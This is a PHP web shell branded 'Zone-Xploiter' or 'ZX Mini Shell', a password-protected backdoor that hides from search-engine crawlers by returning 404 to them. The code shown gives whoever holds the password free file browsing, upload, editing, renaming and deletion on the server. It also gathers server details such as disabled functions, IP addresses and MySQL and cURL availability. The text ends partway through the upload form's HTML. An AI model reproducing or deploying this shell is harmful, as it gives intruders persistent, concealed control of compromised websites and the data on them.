<?php
session_start();
error_reporting(0);
set_time_limit(0);


// LOGIN
$auth_pass = '$2a$12$QKXm8Ps1Yu9Vy5paliQtweQwH2dfgS6Qid2YDV.z6j3017FyiIetm'; // Zonex

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
 
function login_shell($error = false) {
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Zone-Xploiter</title>
<link rel="icon" href="https://i.ibb.co.com/yFGKyy5H/1660703905709.png" type="image/png">
<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1"> 
<link href='https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap' rel='stylesheet'>
<style> 
* {
    box-sizing: border-box;
}
body {
    background: #000000;
    margin: 0;
    padding: 0;
    overflow: hidden;
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    color: #fff;
}
.login-container {
    position: relative;
    z-index: 10;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
}
.login-card {
    background: rgba(14, 14, 14, 0.78);
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 20px;
    padding: 40px 32px 30px;
    width: 100%;
    max-width: 360px;
    text-align: center;
    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.9), 0 0 40px rgba(220, 38, 38, 0.12);
    backdrop-filter: blur(16px);
    -webkit-backdrop-filter: blur(16px);
}
.login-logo {
    width: 140px;
    height: 140px;
    border-radius: 50%;
    margin: 0 auto 18px;
    display: block;
    box-shadow: 0 0 30px rgba(220, 38, 38, 0.35);
    transition: transform 0.3s ease;
}
.login-logo:hover {
    transform: scale(1.03);
}
.login-title {
    color: #ffffff;
    font-size: 20px;
    font-weight: 600;
    letter-spacing: 0.5px;
    margin-bottom: 22px;
}
.error-badge {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    background: rgba(239, 68, 68, 0.12);
    border: 1px solid rgba(239, 68, 68, 0.35);
    color: #fca5a5;
    font-size: 13px;
    font-weight: 500;
    padding: 8px 14px;
    border-radius: 8px;
    margin-bottom: 18px;
    width: 100%;
    justify-content: center;
    animation: shake 0.35s ease-in-out;
}
@keyframes shake {
    0%, 100% { transform: translateX(0); }
    20%, 60% { transform: translateX(-6px); }
    40%, 80% { transform: translateX(6px); }
}
.input-wrapper {
    position: relative;
    display: flex;
    align-items: center;
    width: 100%;
}
.input-wrapper input[type=password] {
    width: 100%;
    height: 44px;
    background: rgba(255, 255, 255, 0.04);
    border: 1px solid rgba(255, 255, 255, 0.12);
    border-radius: 10px;
    padding: 0 44px 0 14px;
    color: #ffffff;
    font-size: 14px;
    font-family: inherit;
    outline: none;
    transition: all 0.25s ease;
}
.input-wrapper input[type=password]:focus {
    border-color: #dc2626;
    background: rgba(255, 255, 255, 0.07);
    box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.25);
}
.input-wrapper input[type=password]::placeholder {
    color: rgba(255, 255, 255, 0.3);
    font-size: 13px;
}
.submit-btn {
    position: absolute;
    right: 6px;
    width: 32px;
    height: 32px;
    background: #dc2626;
    border: none;
    border-radius: 7px;
    color: #ffffff;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.2s ease;
}
.submit-btn:hover {
    background: #ef4444;
    transform: scale(1.06);
}
.footer-text {
    color: rgba(255, 255, 255, 0.3);
    font-size: 11px;
    margin-top: 24px;
    letter-spacing: 0.5px;
}
</style> 
</head>
<body> 
<canvas id="stars" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none;"></canvas>

<div class="login-container"> 
    <div class="login-card">
        <img src="https://i.ibb.co.com/yFGKyy5H/1660703905709.png" class="login-logo" alt="Logo">
        <div class="login-title">ZX Mini Shell</div>

        <?php if ($error): ?>
            <div class="error-badge">
                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
                Password salah!
            </div>
        <?php endif; ?>

        <form method="post">
            <div class="input-wrapper">
                <input type="password" name="pass" placeholder="Enter password..." autofocus required>
                <button type="submit" class="submit-btn" title="Login">
                    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
                </button>
            </div>
        </form>
        <div class="footer-text">&copy; 2026 <a href="https://github.com/Zone-Xploiter" target="_blank" rel="noopener noreferrer" style="color: #f87171; text-decoration: none; font-weight: 500;">Zone-Xploiter</a></div>
    </div>
</div>

<script>
(function(){
    var c = document.getElementById("stars");
    if (!c) return;
    var ctx = c.getContext("2d"), w, h, pts = [];
    function resize() { w = c.width = window.innerWidth; h = c.height = window.innerHeight; }
    window.addEventListener("resize", resize);
    resize();
    for (var i = 0; i < 45; i++) {
        pts.push({
            x: Math.random() * w,
            y: Math.random() * h,
            r: Math.random() * 1.5 + 0.5,
            vx: (Math.random() - 0.5) * 0.4,
            vy: (Math.random() - 0.5) * 0.4
        });
    }
    function loop() {
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = "rgba(220, 38, 38, 0.35)";
        for (var i = 0; i < pts.length; i++) {
            var p = pts[i];
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
            ctx.fill();
            p.x += p.vx; p.y += p.vy;
            if (p.x < 0) p.x = w; if (p.x > w) p.x = 0;
            if (p.y < 0) p.y = h; if (p.y > h) p.y = 0;
        }
        requestAnimationFrame(loop);
    }
    loop();
})();
</script>
</body>
</html>
<?php
    exit;
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass'])) {
        if (password_verify($_POST['pass'], $auth_pass)) {
            $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
            echo "<script>window.location='?';</script>";
            exit;
        } else {
            login_shell(true);
        }
    } else {
        login_shell();
    }
}

if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
    foreach ($_POST as $key => $value) {
        $_POST[$key] = stripslashes($value);
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Dashboard - Zone-Xploiter</title>
    <link rel="icon" href="https://i.ibb.co.com/yFGKyy5H/1660703905709.png" type="image/png"> 
    <meta property="og:image" content="https://i.ibb.co.com/yFGKyy5H/1660703905709.png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-main: #0a0a0c;
            --bg-card: #121216;
            --bg-card-hover: #17171d;
            --border-color: rgba(255, 255, 255, 0.07);
            --border-focus: rgba(239, 68, 68, 0.4);
            --accent-red: #ef4444;
            --accent-red-hover: #dc2626;
            --accent-green: #10b981;
            --accent-amber: #f59e0b;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
            --text-dim: #6b7280;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            scrollbar-width: thin;
            scrollbar-color: #262630 #0a0a0c;
        }

        /* Custom Drag Scrollbar */
        ::-webkit-scrollbar {
            width: 7px;
            height: 7px;
        }
        ::-webkit-scrollbar-track {
            background: #0a0a0c;
        }
        ::-webkit-scrollbar-thumb {
            background: #262630;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #ef4444;
        }
        textarea::-webkit-resizer {
            background-color: #1a1a22;
        }

        body {
            background-color: var(--bg-main);
            color: var(--text-main);
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            font-size: 13px;
            line-height: 1.45;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        a {
            color: inherit;
            text-decoration: none;
            transition: all 0.15s ease;
        }

        .container {
            width: 100%;
            max-width: 1320px;
            margin: 0 auto;
            padding: 10px 16px 30px;
            flex: 1;
        }

        /* Navbar */
        .navbar {
            background: rgba(18, 18, 22, 0.9);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-bottom: 1px solid var(--border-color);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .nav-inner {
            max-width: 1320px;
            margin: 0 auto;
            padding: 8px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
        }
        .nav-brand {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 700;
            font-size: 15px;
            letter-spacing: -0.2px;
        }
        .nav-logo {
            width: 26px;
            height: 26px;
            border-radius: 50%;
            box-shadow: 0 0 10px rgba(239, 68, 68, 0.35);
        }
        .badge-version {
            font-size: 9.5px;
            font-weight: 600;
            background: rgba(239, 68, 68, 0.15);
            color: var(--accent-red);
            border: 1px solid rgba(239, 68, 68, 0.3);
            padding: 1px 6px;
            border-radius: 12px;
        }
        .nav-actions {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        /* Buttons */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            padding: 5px 11px;
            border-radius: 6px;
            font-size: 11.5px;
            font-weight: 500;
            cursor: pointer;
            border: 1px solid transparent;
            transition: all 0.15s ease;
            font-family: inherit;
        }
        .btn-sm {
            padding: 4px 8px;
            font-size: 11px;
            border-radius: 5px;
        }
        .btn-secondary {
            background: rgba(255, 255, 255, 0.05);
            border-color: var(--border-color);
            color: var(--text-main);
        }
        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
        }
        .btn-danger {
            background: rgba(239, 68, 68, 0.15);
            border-color: rgba(239, 68, 68, 0.3);
            color: #fca5a5;
        }
        .btn-danger:hover {
            background: var(--accent-red);
            color: #fff;
            border-color: var(--accent-red);
        }
        .btn-primary {
            background: var(--accent-red);
            color: #fff;
        }
        .btn-primary:hover {
            background: var(--accent-red-hover);
            box-shadow: 0 0 12px rgba(239, 68, 68, 0.4);
        }

        /* 1-Container Compact Path & System Info Bar */
        .compact-header-card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 8px 14px;
            margin: 10px 0 12px;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .header-path-row {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 5px;
            font-size: 12.5px;
        }
        .path-label {
            color: var(--accent-amber);
            font-weight: 600;
            font-size: 11.5px;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            margin-right: 2px;
        }
        .crumb-item {
            color: var(--text-muted);
            padding: 1px 6px;
            border-radius: 4px;
            background: rgba(255, 255, 255, 0.03);
            font-family: 'JetBrains Mono', monospace;
            font-size: 11.5px;
        }
        .crumb-item:hover {
            color: #fff;
            background: rgba(255, 255, 255, 0.08);
        }
        .crumb-sep {
            color: var(--text-dim);
            font-size: 11px;
        }

        .header-sysinfo-row {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px 12px;
            font-size: 11.5px;
            padding-top: 6px;
            border-top: 1px solid rgba(255, 255, 255, 0.04);
            color: var(--text-muted);
        }
        .info-item {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-family: 'JetBrains Mono', monospace;
        }
        .info-tag {
            color: var(--text-dim);
            font-weight: 600;
            text-transform: uppercase;
            font-size: 10px;
            letter-spacing: 0.4px;
        }
        .info-sep-bullet {
            color: rgba(255, 255, 255, 0.15);
        }

        .pill-status {
            display: inline-block;
            font-size: 10px;
            font-weight: 600;
            padding: 1px 6px;
            border-radius: 10px;
        }
        .pill-green {
            background: rgba(16, 185, 129, 0.15);
            color: #6ee7b7;
            border: 1px solid rgba(16, 185, 129, 0.3);
        }
        .pill-red {
            background: rgba(239, 68, 68, 0.15);
            color: #fca5a5;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
        .pill-amber {
            background: rgba(245, 158, 11, 0.15);
            color: #fcd34d;
            border: 1px solid rgba(245, 158, 11, 0.3);
        }

        /* Compact Action Toolbar (Upload & Create Folder in 1 Row) */
        .compact-toolbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 12px;
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 9px;
            padding: 6px 12px;
        }
        .tool-group {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .input-text-compact {
            height: 30px;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 0 10px;
            color: #fff;
            font-family: inherit;
            font-size: 11.5px;
            outline: none;
            width: 160px;
            transition: all 0.15s;
        }
        .input-text-compact:focus {
            border-color: var(--accent-red);
            background: rgba(255, 255, 255, 0.07);
        }
        /* Luxury Custom File Upload */
        .custom-file-upload {
            position: relative;
            display: inline-flex;
            align-items: center;
        }
        .custom-file-upload input[type="file"] {
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
            z-index: 2;
        }
        .file-upload-label {
            display: inline-flex;
            align-items: center;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 6px;
            padding: 2px 8px 2px 2px;
            cursor: pointer;
            transition: all 0.2s ease;
            height: 30px;
        }
        .file-upload-label:hover, .custom-file-upload:hover .file-upload-label {
            border-color: rgba(239, 68, 68, 0.45);
            background: rgba(255, 255, 255, 0.07);
            box-shadow: 0 0 12px rgba(239, 68, 68, 0.15);
        }
        .file-upload-btn {
            background: #181820;
            border: 1px solid rgba(255, 255, 255, 0.12);
            color: #e5e7eb;
            font-size: 11px;
            font-weight: 500;
            padding: 3px 9px;
            border-radius: 4px;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            white-space: nowrap;
            transition: all 0.2s ease;
        }
        .file-upload-label:hover .file-upload-btn, .custom-file-upload:hover .file-upload-btn {
            background: var(--accent-red);
            color: #fff;
            border-color: var(--accent-red);
        }
        .file-name-display {
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            color: var(--text-dim);
            margin-left: 8px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 140px;
            transition: color 0.2s;
        }
        .file-name-display.has-file {
            color: #6ee7b7;
            font-weight: 500;
        }

        /* Alert Notifications */
        .alert {
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 12px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .alert-success {
            background: rgba(16, 185, 129, 0.12);
            border: 1px solid rgba(16, 185, 129, 0.3);
            color: #6ee7b7;
        }
        .alert-danger {
            background: rgba(239, 68, 68, 0.12);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #fca5a5;
        }

        /* Main File Table */
        .table-card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.35);
        }
        .table-responsive {
            width: 100%;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
        }
        th {
            background: rgba(255, 255, 255, 0.02);
            border-bottom: 1px solid var(--border-color);
            padding: 8px 12px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: var(--text-dim);
            white-space: nowrap;
        }
        td {
            padding: 7px 12px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
            font-size: 12px;
            color: var(--text-main);
            vertical-align: middle;
            white-space: nowrap;
        }
        tr:last-child td {
            border-bottom: none;
        }
        tr:hover td {
            background: var(--bg-card-hover);
        }
        .item-name {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 500;
        }
        .item-name a:hover {
            color: var(--accent-red);
        }
        .item-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 24px;
            height: 24px;
            border-radius: 6px;
            flex-shrink: 0;
        }
        .icon-dir {
            background: rgba(245, 158, 11, 0.12);
            color: var(--accent-amber);
        }
        .icon-file {
            background: rgba(148, 163, 184, 0.12);
            color: #cbd5e1;
        }
        .item-size {
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            color: var(--text-muted);
        }
        .item-date {
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            color: var(--text-dim);
        }
        .perm-badge {
            font-family: 'JetBrains Mono', monospace;
            font-size: 10.5px;
            font-weight: 600;
            padding: 1px 6px;
            border-radius: 5px;
            display: inline-block;
        }
        .perm-writable {
            background: rgba(16, 185, 129, 0.12);
            color: #34d399;
            border: 1px solid rgba(16, 185, 129, 0.25);
        }
        .perm-readonly {
            background: rgba(239, 68, 68, 0.12);
            color: #f87171;
            border: 1px solid rgba(239, 68, 68, 0.25);
        }

        /* Custom Floating Action Dropdown */
        .custom-dropdown {
            position: relative;
            display: inline-block;
        }
        .dropdown-trigger {
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 6px;
            padding: 3px 9px;
            color: #e5e7eb;
            font-size: 11px;
            font-weight: 500;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            transition: all 0.15s ease;
            font-family: inherit;
        }
        .dropdown-trigger:hover, .custom-dropdown.active .dropdown-trigger {
            border-color: rgba(239, 68, 68, 0.5);
            background: #181820;
            color: #fff;
            box-shadow: 0 0 10px rgba(239, 68, 68, 0.2);
        }
        .dropdown-menu {
            display: none;
            position: absolute;
            right: 0;
            top: calc(100% + 4px);
            background: #121217;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            min-width: 105px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.7);
            z-index: 100;
            padding: 4px;
        }
        .custom-dropdown.active .dropdown-menu {
            display: block;
            animation: fadeInDown 0.12s ease-out;
        }
        @keyframes fadeInDown {
            from { opacity: 0; transform: translateY(-3px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .dropdown-item {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 5px 8px;
            color: #d1d5db;
            font-size: 11px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.12s ease;
            white-space: nowrap;
            text-decoration: none;
        }
        .dropdown-item:hover {
            background: rgba(255, 255, 255, 0.08);
            color: #fff;
        }
        .dropdown-item.text-danger {
            color: #fca5a5;
        }
        .dropdown-item.text-danger:hover {
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
        }

        /* Compact SweetAlert Styling */
        .swal-compact {
            font-size: 11.5px !important;
            border-radius: 12px !important;
            border: 1px solid rgba(255, 255, 255, 0.1) !important;
            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.8) !important;
            padding: 14px 16px !important;
        }
        .swal-compact .swal2-title {
            font-size: 13.5px !important;
            padding: 4px 0 0 !important;
        }
        .swal-compact .swal2-icon {
            transform: scale(0.6) !important;
            margin: 4px auto !important;
        }
        .swal-compact .swal2-html-container {
            font-size: 11.5px !important;
            margin: 4px 0 10px !important;
        }
        .swal-compact .swal2-actions {
            margin: 6px 0 0 !important;
            gap: 6px !important;
        }
        .swal-compact .swal2-actions button {
            font-size: 11px !important;
            padding: 5px 12px !important;
            border-radius: 6px !important;
        }
        .swal-about-img {
            border-radius: 50% !important;
            box-shadow: 0 0 16px rgba(239, 68, 68, 0.4) !important;
            margin: 10px auto 4px !important;
        }

        /* Editor & Viewer Panels */
        .panel-card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 16px;
            margin-bottom: 16px;
        }
        .panel-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 12px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .panel-title {
            font-size: 14px;
            font-weight: 600;
            color: #fff;
            display: flex;
            align-items: center;
            gap: 6px;
            word-break: break-all;
        }
        .editor-textarea {
            width: 100%;
            height: 420px;
            background: #0d0d10;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 12px;
            color: #e2e8f0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 12.5px;
            line-height: 1.5;
            outline: none;
            resize: vertical;
        }
        .editor-textarea:focus {
            border-color: var(--border-focus);
            box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.15);
        }

        /* Footer */
        .footer {
            border-top: 1px solid var(--border-color);
            text-align: center;
            padding: 12px;
            color: var(--text-dim);
            font-size: 11.5px;
        }
        .footer a:hover {
            color: var(--accent-red);
        }

        /* Responsive Breakpoints */
        @media (max-width: 768px) {
            .compact-toolbar {
                flex-direction: column;
                align-items: stretch;
            }
            .tool-group {
                width: 100%;
                justify-content: space-between;
            }
            .input-text-compact {
                width: 100%;
            }
            .nav-inner {
                flex-direction: column;
                align-items: flex-start;
            }
            .nav-actions {
                width: 100%;
                justify-content: space-between;
            }
        }
    </style>
</head>
<body>

<?php 
// Directory Navigation
if (isset($_GET['path'])) { 
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
    $path = getcwd();
}
$path = str_replace("\\", "/", $path);
$paths = explode("/", $path); 

// Logout Handler
if (isset($_GET['logout']) && $_GET['logout'] == 'true') {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    echo "<script>window.location='?';</script>";
    exit;
}

// Action Messages via Session Flash
$notify_msg = '';
if (isset($_SESSION['notify_msg'])) {
    $notify_msg = $_SESSION['notify_msg'];
    unset($_SESSION['notify_msg']);
}

// Create Folder Handler
if (isset($_POST['buat'])) {
    $nama_folder = trim($_POST['namafolder']);
    if (!empty($nama_folder)) {
        if (@mkdir($path . '/' . $nama_folder, 0777, true)) {
            $_SESSION['notify_msg'] = '<div class="alert alert-success">✓ Folder berhasil dibuat: <b>' . htmlspecialchars($nama_folder) . '</b></div>';
        } else {
            $_SESSION['notify_msg'] = '<div class="alert alert-danger">✕ Gagal membuat folder! Periksa izin direktori.</div>';
        }
    }
    echo "<script>window.location='?path=" . urlencode($path) . "';</script>";
    exit;
}

// File Upload Handler
if (isset($_FILES['file'])) { 
    $target_upload = $path . '/' . $_FILES['file']['name'];
    if (@copy($_FILES['file']['tmp_name'], $target_upload)) { 
        $_SESSION['notify_msg'] = '<div class="alert alert-success">✓ Berkas berhasil diunggah: <b>' . htmlspecialchars($_FILES['file']['name']) . '</b></div>';
    } else {
        $_SESSION['notify_msg'] = '<div class="alert alert-danger">✕ Gagal mengunggah berkas! Periksa izin direktori.</div>';
    }
    echo "<script>window.location='?path=" . urlencode($path) . "';</script>";
    exit;
}

// Option Handlers: Rename, Edit, Delete
if (isset($_GET['option']) && isset($_POST['opt'])) {
    if ($_POST['opt'] == 'rename' && isset($_POST['newname']) && !empty($_POST['newname'])) {
        $old_p = $_POST['path'];
        $new_p = $path . '/' . trim($_POST['newname']);
        if (@rename($old_p, $new_p)) {
            $_SESSION['notify_msg'] = '<div class="alert alert-success">✓ Berhasil ganti nama menjadi: <b>' . htmlspecialchars($_POST['newname']) . '</b></div>';
        } else {
            $_SESSION['notify_msg'] = '<div class="alert alert-danger">✕ Gagal mengganti nama!</div>';
        }
        echo "<script>window.location='?path=" . urlencode($path) . "';</script>";
        exit;
    } elseif ($_POST['opt'] == 'edit' && isset($_POST['src'])) {
        $fp = @fopen($_POST['path'], 'w');
        if ($fp && @fwrite($fp, $_POST['src']) !== false) {
            $_SESSION['notify_msg'] = '<div class="alert alert-success">✓ Perubahan berkas berhasil disimpan!</div>';
            @fclose($fp);
            echo "<script>window.location='?path=" . urlencode($path) . "';</script>";
            exit;
        } else {
            $notify_msg = '<div class="alert alert-danger">✕ Gagal menyimpan perubahan berkas!</div>';
        }
    } elseif ($_POST['opt'] == 'delete') {
        if ($_POST['type'] == 'dir') {
            if (@rmdir($_POST['path'])) {
                $_SESSION['notify_msg'] = '<div class="alert alert-success">✓ Folder berhasil dihapus!</div>';
            } else {
                $_SESSION['notify_msg'] = '<div class="alert alert-danger">✕ Gagal menghapus folder (pastikan folder kosong).</div>';
            }
        } elseif ($_POST['type'] == 'file') {
            if (@unlink($_POST['path'])) {
                $_SESSION['notify_msg'] = '<div class="alert alert-success">✓ Berkas berhasil dihapus!</div>';
            } else {
                $_SESSION['notify_msg'] = '<div class="alert alert-danger">✕ Gagal menghapus berkas!</div>';
            }
        }
        echo "<script>window.location='?path=" . urlencode($path) . "';</script>";
        exit;
    }
}

// System Information Data
$fun = @ini_get("disable_functions");
$df_count = !empty($fun) ? count(explode(',', $fun)) : 0;
$server_ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME'] ?? 'localhost');
$client_ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
$has_mysql = (function_exists('mysqli_connect') || function_exists('mysql_connect'));
$has_curl  = function_exists('curl_version');
?>

<!-- Navbar -->
<nav class="navbar">
    <div class="nav-inner">
        <div class="nav-brand">
            <img src="https://i.ibb.co.com/yFGKyy5H/1660703905709.png" alt="Logo" class="nav-logo">
            <span>ZX Dashboard</span>
            <span class="badge-version">v2.0</span>
        </div>
        <div class="nav-actions">
            <a href="?" class="btn btn-secondary btn-sm" title="Home">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
                Home
            </a>
            <a href="?path=<?= urlencode($path) ?>" class="btn btn-secondary btn-sm" title="Refresh">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"></polyline><polyline points="1 20 1 14 7 14"></polyline><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path></svg>
                Refresh
            </a>
            <button type="button" class="btn btn-secondary btn-sm" onclick="showAboutModal()" title="About Project">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
                About
            </button>
            <a href="?logout=true" class="btn btn-danger btn-sm" title="Logout">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
                Logout
            </a>
        </div>
    </div>
</nav>

<div class="container">

    <!-- Compact Path & System Info Bar (All-In-One Container) -->
    <div class="compact-header-card">
        <div class="header-path-row">
            <span class="path-label">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
                PATH:
            </span>
            <?php 
            foreach ($paths as $id => $pat) {
                if ($pat === '' && $id !== 0) continue;
                echo "<a class='crumb-item' href='?path=";
                for ($i = 0; $i <= $id; $i++) {
                    echo $paths[$i];
                    if ($i != $id) echo "/";
                }
                echo "'>" . ($pat === '' ? '/' : htmlspecialchars($pat)) . "</a>";
                if ($id < count($paths) - 1) {
                    echo "<span class='crumb-sep'>/</span>";
                }
            }
            ?>
        </div>
        <div class="header-sysinfo-row">
            <div class="info-item">
                <span class="info-tag">OS:</span>
                <span><?= PHP_OS ?> <span class="pill-status pill-green">PHP <?= PHP_VERSION ?></span></span>
            </div>
            <span class="info-sep-bullet">•</span>
            <div class="info-item">
                <span class="info-tag">IP:</span>
                <span><?= htmlspecialchars($server_ip) ?> <span style="opacity:0.4;">/</span> <?= htmlspecialchars($client_ip) ?></span>
            </div>
            <span class="info-sep-bullet">•</span>
            <div class="info-item">
                <span class="info-tag">Disable Func:</span>
                <span>
                    <?php if ($df_count > 0): ?>
                        <span class="pill-status pill-amber"><?= $df_count ?> Off</span>
                    <?php else: ?>
                        <span class="pill-status pill-green">Bersih (Semua Aktif)</span>
                    <?php endif; ?>
                </span>
            </div>
            <span class="info-sep-bullet">•</span>
            <div class="info-item">
                <span class="info-tag">Modul:</span>
                <span>
                    MySQL <?= $has_mysql ? '<span class="pill-status pill-green">ON</span>' : '<span class="pill-status pill-red">OFF</span>' ?>
                    cURL <?= $has_curl ? '<span class="pill-status pill-green">ON</span>' : '<span class="pill-status pill-red">OFF</span>' ?>
                </span>
            </div>
        </div>
    </div>

    <!-- Notification Alert -->
    <?= $notify_msg ?>

    <!-- Compact Action Toolbar (Upload & Create Folder in 1 Compact Row) -->
    <div class="compact-toolbar">
        <form enctype="multipart/form-data" method="POST" class="tool-group">
            <div class="custom-file-upload">
                <input type="file" name="file" id="file-uploader" onchange="updateFileName(this)" required>
                <label for="file-uploader" class="file-upload-label" title="Pilih berkas">
                    <span class="file-upload-btn">
